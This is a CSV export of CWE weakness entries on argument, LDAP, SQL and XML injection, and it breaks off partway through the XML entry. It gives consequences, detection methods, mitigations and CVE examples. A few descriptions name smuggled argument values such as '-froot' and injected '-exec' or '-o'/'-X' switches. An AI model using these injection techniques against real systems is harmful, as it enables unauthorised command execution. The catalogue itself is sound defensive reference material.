    "content": "CWE-ID,Name,Weakness Abstraction,Status,Description,Extended Description,Related Weaknesses,Weakness Ordinalities,Applicable Platforms,Background Details,Alternate Terms,Modes Of Introduction,Exploitation Factors,Likelihood of Exploit,Common Consequences,Detection Methods,Potential Mitigations,Observed Examples,Functional Areas,Affected Resources,Taxonomy Mappings,Related Attack Patterns,Notes\n88,\"Improper Neutralization of Argument Delimiters in a Command ('Argument Injection')\",Base,Draft,\"The product constructs a string for a command to be executed by a separate component in another control sphere, but it does not properly delimit the intended arguments, options, or switches within that command string.\",\"When creating commands using interpolation into a string, developers may assume that only the arguments/options that they specify will be processed. This assumption may be even stronger when the programmer has encoded the command in a way that prevents separate commands from being provided maliciously, e.g. in the case of shell metacharacters. When constructing the command, the developer may use whitespace or other delimiters that are required to separate arguments when the command. However, if an attacker can provide an untrusted input that contains argument-separating delimiters, then the resulting command will have more arguments than intended by the developer. The attacker may then be able to change the behavior of the command. Depending on the functionality supported by the extraneous arguments, this may have security-relevant consequences.\",::NATURE:ChildOf:CWE ID:77:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:74:VIEW ID:1003:ORDINAL:Primary::NATURE:ChildOf:CWE ID:77:VIEW ID:1305:ORDINAL:Primary::NATURE:ChildOf:CWE ID:77:VIEW ID:1340:ORDINAL:Primary::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:PHP:LANGUAGE PREVALENCE:Often::,\"\",\"\",\"::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:SCOPE:Other:IMPACT:Execute Unauthorized Code or Commands:IMPACT:Alter Execution Logic:IMPACT:Read Application Data:IMPACT:Modify Application Data:NOTE:An attacker could include arguments that allow unintended commands or code to be executed, allow sensitive data to be read or modified or could cause other unintended behavior.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation:STRATEGY:Parameterization:DESCRIPTION:Where possible, avoid building a single string that contains the command and its arguments. Some languages or frameworks have functions that support specifying independent arguments, e.g. as an array, which is used to automatically perform the appropriate quoting or escaping while building the command. For example, in PHP, escapeshellarg() can be used to escape a single argument to system(), or exec() can be called with an array of arguments. In C, code can often be refactored from using system() - which accepts a single string - to using exec(), which requires separate function arguments for each parameter.:EFFECTIVENESS:High::PHASE:Architecture and Design:STRATEGY:Input Validation:DESCRIPTION:Understand all the potential areas where untrusted inputs can enter your product: parameters or arguments, cookies, anything read from the network, environment variables, request headers as well as content, URL components, e-mail, files, databases, and any external systems that provide data to the application. Perform input validation at well-defined interfaces.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.::PHASE:Implementation:DESCRIPTION:Directly convert your input type into the expected data type, such as using a conversion function that translates a string into a number. After converting to the expected data type, ensure that the input's values fall within the expected range of allowable values and that multi-field consistencies are maintained.::PHASE:Implementation:DESCRIPTION:Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180, CWE-181). Make sure that your application does not inadvertently decode the same input twice (CWE-174). Such errors could be used to bypass allowlist schemes by introducing dangerous inputs after they have been checked. Use libraries such as the OWASP ESAPI Canonicalization control. Consider performing repeated canonicalization until your input does not change any more. This will avoid double-decoding and similar scenarios, but it might inadvertently modify inputs that are allowed to contain properly-encoded dangerous content.::PHASE:Implementation:DESCRIPTION:When exchanging data between components, ensure that both components are using the same character encoding. Ensure that the proper encoding is applied at each interface. Explicitly set the encoding you are using whenever the protocol allows you to do so.::PHASE:Implementation:DESCRIPTION:When your application combines data from multiple sources, perform the validation after the sources have been combined. The individual data elements may pass the validation step but violate the intended restrictions after they have been combined.::PHASE:Testing:DESCRIPTION:Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible.::PHASE:Testing:DESCRIPTION:Use dynamic tools and techniques that interact with the product using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The product's operation may slow down, but it should not become unstable, crash, or generate incorrect results.::\",\"::REFERENCE:CVE-2022-36069:DESCRIPTION:Python-based dependency management tool avoids OS command injection when generating Git commands but allows injection of optional arguments with input beginning with a dash (CWE-88), potentially allowing for code execution.:LINK:https://www.cve.org/CVERecord?id=CVE-2022-36069::REFERENCE:CVE-1999-0113:DESCRIPTION:Canonical Example - -froot argument is passed on to another program, where the -f causes execution as user root:LINK:https://www.cve.org/CVERecord?id=CVE-1999-0113::REFERENCE:CVE-2001-0150:DESCRIPTION:Web browser executes Telnet sessions using command line arguments that are specified by the web site, which could allow remote attackers to execute arbitrary commands.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0150::REFERENCE:CVE-2001-0667:DESCRIPTION:Web browser allows remote attackers to execute commands by spawning Telnet with a log file option on the command line and writing arbitrary code into an executable file which is later executed.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0667::REFERENCE:CVE-2002-0985:DESCRIPTION:Argument injection vulnerability in the mail function for PHP may allow attackers to bypass safe mode restrictions and modify command line arguments to the MTA (e.g. sendmail) possibly executing commands.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0985::REFERENCE:CVE-2003-0907:DESCRIPTION:Help and Support center in windows does not properly validate HCP URLs, which allows remote attackers to execute arbitrary code via quotation marks in an hcp:// URL.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0907::REFERENCE:CVE-2004-0121:DESCRIPTION:Mail client does not sufficiently filter parameters of mailto: URLs when using them as arguments to mail executable, which allows remote attackers to execute arbitrary programs.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0121::REFERENCE:CVE-2004-0473:DESCRIPTION:Web browser doesn't filter - when invoking various commands, allowing command-line switches to be specified.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0473::REFERENCE:CVE-2004-0480:DESCRIPTION:Mail client allows remote attackers to execute arbitrary code via a URI that uses a UNC network share pathname to provide an alternate configuration file.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0480::REFERENCE:CVE-2004-0489:DESCRIPTION:SSH URI handler for web browser allows remote attackers to execute arbitrary code or conduct port forwarding via the a command line option.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0489::REFERENCE:CVE-2004-0411:DESCRIPTION:Web browser doesn't filter - when invoking various commands, allowing command-line switches to be specified.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0411::REFERENCE:CVE-2005-4699:DESCRIPTION:Argument injection vulnerability in TellMe 1.2 and earlier allows remote attackers to modify command line arguments for the Whois program and obtain sensitive information via -- style options in the q_Host parameter.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-4699::REFERENCE:CVE-2006-1865:DESCRIPTION:Beagle before 0.2.5 can produce certain insecure command lines to launch external helper applications while indexing, which allows attackers to execute arbitrary commands. NOTE: it is not immediately clear whether this issue involves argument injection, shell metacharacters, or other issues.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-1865::REFERENCE:CVE-2006-2056:DESCRIPTION:Argument injection vulnerability in Internet Explorer 6 for Windows XP SP2 allows user-assisted remote attackers to modify command line arguments to an invoked mail client via (double quote) characters in a mailto: scheme handler, as demonstrated by launching Microsoft Outlook with an arbitrary filename as an attachment. NOTE: it is not clear whether this issue is implementation-specific or a problem in the Microsoft API.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-2056::REFERENCE:CVE-2006-2057:DESCRIPTION:Argument injection vulnerability in Mozilla Firefox 1.0.6 allows user-assisted remote attackers to modify command line arguments to an invoked mail client via (double quote) characters in a mailto: scheme handler, as demonstrated by launching Microsoft Outlook with an arbitrary filename as an attachment. NOTE: it is not clear whether this issue is implementation-specific or a problem in the Microsoft API.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-2057::REFERENCE:CVE-2006-2058:DESCRIPTION:Argument injection vulnerability in Avant Browser 10.1 Build 17 allows user-assisted remote attackers to modify command line arguments to an invoked mail client via (double quote) characters in a mailto: scheme handler, as demonstrated by launching Microsoft Outlook with an arbitrary filename as an attachment. NOTE: it is not clear whether this issue is implementation-specific or a problem in the Microsoft API.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-2058::REFERENCE:CVE-2006-2312:DESCRIPTION:Argument injection vulnerability in the URI handler in Skype 2.0.*.104 and 2.5.*.0 through 2.5.*.78 for Windows allows remote authorized attackers to download arbitrary files via a URL that contains certain command-line switches.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-2312::REFERENCE:CVE-2006-3015:DESCRIPTION:Argument injection vulnerability in WinSCP 3.8.1 build 328 allows remote attackers to upload or download arbitrary files via encoded spaces and double-quote characters in a scp or sftp URI.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-3015::REFERENCE:CVE-2006-4692:DESCRIPTION:Argument injection vulnerability in the Windows Object Packager (packager.exe) in Microsoft Windows XP SP1 and SP2 and Server 2003 SP1 and earlier allows remote user-assisted attackers to execute arbitrary commands via a crafted file with a / (slash) character in the filename of the Command Line property, followed by a valid file extension, which causes the command before the slash to be executed, aka Object Packager Dialogue Spoofing Vulnerability.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-4692::REFERENCE:CVE-2006-6597:DESCRIPTION:Argument injection vulnerability in HyperAccess 8.4 allows user-assisted remote attackers to execute arbitrary vbscript and commands via the /r option in a telnet:// URI, which is configured to use hawin32.exe.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-6597::REFERENCE:CVE-2007-0882:DESCRIPTION:Argument injection vulnerability in the telnet daemon (in.telnetd) in Solaris 10 and 11 (SunOS 5.10 and 5.11) misinterprets certain client -f sequences as valid requests for the login program to skip authentication, which allows remote attackers to log into certain accounts, as demonstrated by the bin account.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-0882::REFERENCE:CVE-2001-1246:DESCRIPTION:Language interpreter's mail function accepts another argument that is concatenated to a string used in a dangerous popen() call. Since there is no neutralization of this argument, both OS Command Injection (CWE-78) and Argument Injection (CWE-88) are possible.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1246::REFERENCE:CVE-2019-13475:DESCRIPTION:Argument injection allows execution of arbitrary commands by injecting a -exec option, which is executed by the command.:LINK:https://www.cve.org/CVERecord?id=CVE-2019-13475::REFERENCE:CVE-2016-10033:DESCRIPTION:Argument injection in mail-processing function allows writing unxpected files and executing programs using tecnically-valid email addresses that insert -o and -X switches.:LINK:https://www.cve.org/CVERecord?id=CVE-2016-10033::\",,::System Process::,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Argument Injection or Modification::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:ENV03-C:ENTRY NAME:Sanitize the environment when invoking external programs::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:ENV33-C:ENTRY NAME:Do not call system():MAPPING FIT:Imprecise::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:STR02-C:ENTRY NAME:Sanitize data passed to complex subsystems::TAXONOMY NAME:WASC:ENTRY ID:30:ENTRY NAME:Mail Command Injection::\",::137::174::41::460::88::,\"::TYPE:Relationship:NOTE:At one layer of abstraction, this can overlap other weaknesses that have whitespace problems, e.g. injection of javascript into attributes of HTML tags.::\",\n90,\"Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection')\",Base,Draft,\"The product constructs all or part of an LDAP query using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended LDAP query when it is sent to a downstream component.\",\"\",::NATURE:ChildOf:CWE ID:943:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY NAME:Database Server:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:IMPACT:Execute Unauthorized Code or Commands:IMPACT:Read Application Data:IMPACT:Modify Application Data:NOTE:An attacker could include input that changes the LDAP query which allows unintended commands or code to be executed, allows sensitive data to be read or modified or causes other unintended behavior.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.::\",\"::REFERENCE:CVE-2021-41232:DESCRIPTION:Chain: authentication routine in Go-based agile development product does not escape user name (CWE-116), allowing LDAP injection (CWE-90):LINK:https://www.cve.org/CVERecord?id=CVE-2021-41232::REFERENCE:CVE-2005-2301:DESCRIPTION:Server does not properly escape LDAP queries, which allows remote attackers to cause a DoS and possibly conduct an LDAP injection attack.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2301::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:LDAP injection::TAXONOMY NAME:OWASP Top Ten 2007:ENTRY ID:A2:ENTRY NAME:Injection Flaws:MAPPING FIT:CWE More Specific::TAXONOMY NAME:WASC:ENTRY ID:29:ENTRY NAME:LDAP Injection::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP24:ENTRY NAME:Tainted input to command::\",::136::,\"::TYPE:Relationship:NOTE:Factors: resultant to special character mismanagement, MAID, or denylist/allowlist problems. Can be primary to authentication and verification errors.::\",\n89,\"Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\",Base,Stable,\"The product constructs all or part of an SQL command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command when it is sent to a downstream component. Without sufficient removal or quoting of SQL syntax in user-controllable inputs, the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary user data.\",\"\",::NATURE:ChildOf:CWE ID:943:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:74:VIEW ID:1003:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY NAME:Database Server:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"::TERM:SQL injection:DESCRIPTION:a common attack-oriented phrase::TERM:SQLi:DESCRIPTION:a common abbreviation for SQL injection::\",\"::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::PHASE:Implementation:NOTE:This weakness typically appears in data-rich applications that save user inputs in a database.::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:IMPACT:Execute Unauthorized Code or Commands:NOTE:Adversaries could execute system commands, typically by changing the SQL statement to redirect output to a file that can then be executed.::SCOPE:Confidentiality:IMPACT:Read Application Data:NOTE:Since SQL databases generally hold sensitive data, loss of confidentiality is a frequent problem with SQL injection vulnerabilities.::SCOPE:Authentication:IMPACT:Gain Privileges or Assume Identity:IMPACT:Bypass Protection Mechanism:NOTE:If poor SQL commands are used to check user names and passwords or perform other kinds of authentication, it may be possible to connect to the product as another user with no previous knowledge of the password.::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism:NOTE:If authorization information is held in a SQL database, it may be possible to change this information through the successful exploitation of a SQL injection vulnerability.::SCOPE:Integrity:IMPACT:Modify Application Data:NOTE:Just as it may be possible to read sensitive information, it is also possible to modify or even delete this information with a SQL injection attack.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:This weakness can often be detected using automated static analysis tools. Many modern tools use data flow analysis or constraint-based techniques to minimize the number of false positives. Automated static analysis might not be able to recognize when proper input validation is being performed, leading to false positives - i.e., warnings that do not have any security consequences or do not require any code changes. Automated static analysis might not be able to detect the usage of custom API functions or third-party libraries that indirectly invoke SQL commands, leading to false negatives - especially if the API/library code is not available for analysis.::METHOD:Automated Dynamic Analysis:DESCRIPTION:This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.:EFFECTIVENESS:Moderate::METHOD:Manual Analysis:DESCRIPTION:Manual analysis can be useful for finding this weakness, but it might not achieve desired code coverage within limited time constraints. This becomes difficult for weaknesses that must be considered for all inputs, since the attack surface can be too large.::METHOD:Automated Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Bytecode Weakness Analysis - including disassembler + source code weakness analysis Binary Weakness Analysis - including disassembler + source code weakness analysis:EFFECTIVENESS:High::METHOD:Dynamic Analysis with Automated Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Database Scanners Cost effective for partial coverage: Web Application Scanner Web Services Scanner:EFFECTIVENESS:High::METHOD:Dynamic Analysis with Manual Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Fuzz Tester Framework-based Fuzzer:EFFECTIVENESS:SOAR Partial::METHOD:Manual Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Manual Source Code Review (not inspections) Cost effective for partial coverage: Focused Manual Spotcheck - Focused manual analysis of source:EFFECTIVENESS:High::METHOD:Automated Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Source code Weakness Analyzer Context-configured Source Code Weakness Analyzer:EFFECTIVENESS:High::METHOD:Architecture or Design Review:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Formal Methods / Correct-By-Construction Cost effective for partial coverage: Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.):EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design:STRATEGY:Libraries or Frameworks:DESCRIPTION:Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid. For example, consider using persistence layers such as Hibernate or Enterprise Java Beans, which can provide significant protection against SQL injection if used properly.::PHASE:Architecture and Design:STRATEGY:Parameterization:DESCRIPTION:If available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated. Process SQL queries using prepared statements, parameterized queries, or stored procedures. These features should accept parameters or variables and support strong typing. Do not dynamically construct and execute query strings within these features using exec or similar functionality, since this may re-introduce the possibility of SQL injection. [REF-867]::PHASE:Architecture and Design Operation:STRATEGY:Environment Hardening:DESCRIPTION:Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations. Specifically, follow the principle of least privilege when creating user accounts to a SQL database. The database users should only have the minimum privileges necessary to use their account. If the requirements of the system indicate that a user can read and modify their own data, then limit their privileges so they cannot read/write others' data. Use the strictest permissions possible on all database objects, such as execute-only for stored procedures.::PHASE:Architecture and Design:DESCRIPTION:For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.::PHASE:Implementation:STRATEGY:Output Encoding:DESCRIPTION:While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict allowlist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88). Instead of building a new implementation, such features may be available in the database or programming language. For example, the Oracle DBMS_ASSERT package can check or enforce that parameters have certain properties that make them less vulnerable to SQL injection. For MySQL, the mysql_real_escape_string() API function is available in both C and PHP.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright. When constructing SQL query strings, use stringent allowlists that limit the character set based on the expected value of the parameter in the request. This will indirectly limit the scope of an attack, but this technique is less important than proper output encoding and escaping. Note that proper output encoding, escaping, and quoting is the most effective solution for preventing SQL injection, although input validation may provide some defense-in-depth. This is because it effectively limits what will appear in output. Input validation will not always prevent SQL injection, especially if you are required to support free-form text fields that could contain arbitrary characters. For example, the name O'Reilly would likely pass the validation step, since it is a common last name in the English language. However, it cannot be directly inserted into the database because it contains the ' apostrophe character, which would need to be escaped or otherwise handled. In this case, stripping the apostrophe might reduce the risk of SQL injection, but it would produce incorrect behavior because the wrong name would be recorded. When feasible, it may be safest to disallow meta-characters entirely, instead of escaping them. This will provide some defense in depth. After the data is entered into the database, later processes may neglect to escape meta-characters before use, and you may not have control over those processes.::PHASE:Architecture and Design:STRATEGY:Enforcement by Conversion:DESCRIPTION:When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.::PHASE:Implementation:DESCRIPTION:Ensure that error messages only contain minimal details that are useful to the intended audience and no one else. The messages need to strike the balance between being too cryptic (which can confuse users) or being too detailed (which may reveal more than intended). The messages should not reveal the methods that were used to determine the error. Attackers can use detailed information to refine or optimize their original attack, thereby increasing their chances of success. If errors must be captured in some detail, record them in log messages, but consider what could occur if the log messages can be viewed by attackers. Highly sensitive information such as passwords should never be saved to log files. Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a user account exists or not. In the context of SQL Injection, error messages revealing the structure of a SQL query can help attackers tailor successful attack strings.::PHASE:Operation:STRATEGY:Firewall:DESCRIPTION:Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.:EFFECTIVENESS:Moderate::PHASE:Operation Implementation:STRATEGY:Environment Hardening:DESCRIPTION:When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.::\",\"::REFERENCE:CVE-2023-32530:DESCRIPTION:SQL injection in security product dashboard using crafted certificate fields:LINK:https://www.cve.org/CVERecord?id=CVE-2023-32530::REFERENCE:CVE-2021-42258:DESCRIPTION:SQL injection in time and billing software, as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2021-42258::REFERENCE:CVE-2021-27101:DESCRIPTION:SQL injection in file-transfer system via a crafted Host header, as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2021-27101::REFERENCE:CVE-2020-12271:DESCRIPTION:SQL injection in firewall product's admin interface or user portal, as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-12271::REFERENCE:CVE-2019-3792:DESCRIPTION:An automation system written in Go contains an API that is vulnerable to SQL injection allowing the attacker to read privileged data.:LINK:https://www.cve.org/CVERecord?id=CVE-2019-3792::REFERENCE:CVE-2004-0366:DESCRIPTION:chain: SQL injection in library intended for database authentication allows SQL injection and authentication bypass.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0366::REFERENCE:CVE-2008-2790:DESCRIPTION:SQL injection through an ID that was supposed to be numeric.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-2790::REFERENCE:CVE-2008-2223:DESCRIPTION:SQL injection through an ID that was supposed to be numeric.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-2223::REFERENCE:CVE-2007-6602:DESCRIPTION:SQL injection via user name.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-6602::REFERENCE:CVE-2008-5817:DESCRIPTION:SQL injection via user name or password fields.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-5817::REFERENCE:CVE-2003-0377:DESCRIPTION:SQL injection in security product, using a crafted group name.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0377::REFERENCE:CVE-2008-2380:DESCRIPTION:SQL injection in authentication library.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-2380::REFERENCE:CVE-2017-11508:DESCRIPTION:SQL injection in vulnerability management and reporting tool, using a crafted password.:LINK:https://www.cve.org/CVERecord?id=CVE-2017-11508::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:SQL injection::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:SQL Injection::TAXONOMY NAME:CLASP:ENTRY NAME:SQL injection::TAXONOMY NAME:OWASP Top Ten 2007:ENTRY ID:A2:ENTRY NAME:Injection Flaws:MAPPING FIT:CWE More Specific::TAXONOMY NAME:OWASP Top Ten 2004:ENTRY ID:A1:ENTRY NAME:Unvalidated Input:MAPPING FIT:CWE More Specific::TAXONOMY NAME:OWASP Top Ten 2004:ENTRY ID:A6:ENTRY NAME:Injection Flaws:MAPPING FIT:CWE More Specific::TAXONOMY NAME:WASC:ENTRY ID:19:ENTRY NAME:SQL Injection::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP24:ENTRY NAME:Tainted input to command::TAXONOMY NAME:OMG ASCSM:ENTRY ID:ASCSM-CWE-89::TAXONOMY NAME:SEI CERT Oracle Coding Standard for Java:ENTRY ID:IDS00-J:ENTRY NAME:Prevent SQL injection:MAPPING FIT:Exact::\",::108::109::110::470::66::7::,\"::TYPE:Relationship:NOTE:SQL injection can be resultant from special character mismanagement, MAID, or denylist/allowlist problems. It can be primary to authentication errors.::\",\n91,\"XML Injection (aka Blind XPath Injection)\",Base,Draft,\"The product does not properly neutralize special elements that are used in XML, allowing attackers to modify the syntax, content, or commands of the XML before it is processed by an end system.\",\"Within XML, special elements could include reserved words or characters such as <, >, , and &, which could then be used to add new data or modify XML syntax.\",::NATURE:ChildOf:CWE ID:74:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:74:VIEW ID:1003:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:IMPACT:Execute Unauthorized Code or Commands:IMPACT:Read Application Data:IMPACT:Modify Application Data::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.::\",\"\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:XML injection (aka Blind Xpath injection)::TAXONOMY NAME:OWASP Top Ten 2007:ENTRY ID:A2:ENTRY NAME:Injection Flaws:MAPPING FIT:CWE More Specific::TAXONOMY NAME:OWASP Top Ten 2004:ENTRY 